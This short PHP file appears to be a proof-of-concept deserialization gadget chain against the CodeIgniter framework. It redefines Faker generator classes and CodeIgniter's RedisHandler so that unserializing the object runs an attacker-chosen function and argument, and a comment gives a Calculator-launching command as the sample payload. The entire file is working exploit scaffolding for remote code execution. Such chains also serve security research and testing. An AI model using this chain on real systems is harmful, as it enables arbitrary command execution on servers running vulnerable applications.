<?php

namespace Faker
{
    class DefaultGenerator
    {
        protected $default;
        
        public function __construct($cmd)
        {
            $this->default = $cmd; //open /System/Applications/Calculator.app
        }
    }
}

namespace Faker
{
    class ValidGenerator
    {
        protected $generator;
        protected $validator;
        protected $maxRetries;

        public function __construct($generator, $func)
        {
            $this->maxRetries = 1; //执行次数
            $this->validator = $func;
            $this->generator = $generator;
        }
    }
}

namespace CodeIgniter\Cache\Handlers 
{
    class RedisHandler 
    {
        protected $redis;

        function __construct($function, $parameter)
        {
            $this->redis = new \Faker\ValidGenerator(new \Faker\DefaultGenerator($parameter), $function);
        }
    }
}
